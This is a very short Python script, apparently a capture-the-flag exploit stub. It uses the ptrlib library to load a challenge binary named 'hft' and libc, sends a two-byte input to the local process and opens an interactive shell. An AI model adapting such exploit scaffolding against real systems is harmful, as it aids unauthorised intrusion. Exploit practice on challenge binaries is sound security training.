#!/usr/bin/env python3
import ptrlib as ptr


elf = ptr.ELF("hft")
libc = ptr.ELF("libc.so.6")
io = ptr.Process(elf.filepath)

io.sendline(b"\x28\x00")
io.sh()